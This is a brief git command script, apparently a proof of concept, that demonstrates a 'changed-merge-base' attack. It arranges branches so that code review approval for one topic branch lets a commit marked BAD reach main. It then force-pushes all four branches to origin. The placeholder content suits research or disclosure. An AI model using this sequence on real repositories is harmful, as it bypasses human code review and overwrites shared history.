#### Exploit for changed-merge-base attack. Get approval for topic3, then merge topic2 into main.

git checkout -f 53763f9

git branch -f main 53763f9
git checkout main
echo main > main.txt ; git add main.txt
echo OK > code.md ; git add code.md
git commit -a -m "main OK"

git branch -f topic1 @

echo main >> main.txt
git commit -a -m "main OK"

git checkout topic1
echo topic1 > topic1.txt ; git add topic1.txt
echo BAD > code.md
git commit -a -m "topic1 BAD"

git branch -f topic3 @

echo topic1 >> topic1.txt
echo OK > code.md
git commit -a -m "topic1 OK"

git branch -f topic2 @

git checkout topic3
echo topic3 > topic3.txt ; git add topic3.txt
echo OK > code.md
git commit -a -m "topic3 OK"

git checkout topic2
git merge --no-commit topic3
echo topic2 > topic2.txt ; git add topic2.txt
git commit -a -m "topic2 merge OK"

git checkout topic3
echo topic3 >> topic3.txt
echo BAD > code.md
git commit -a -m "topic3 BAD"

#####

git checkout main
git merge --no-edit topic1

#####

git push -f origin main topic1 topic2 topic3
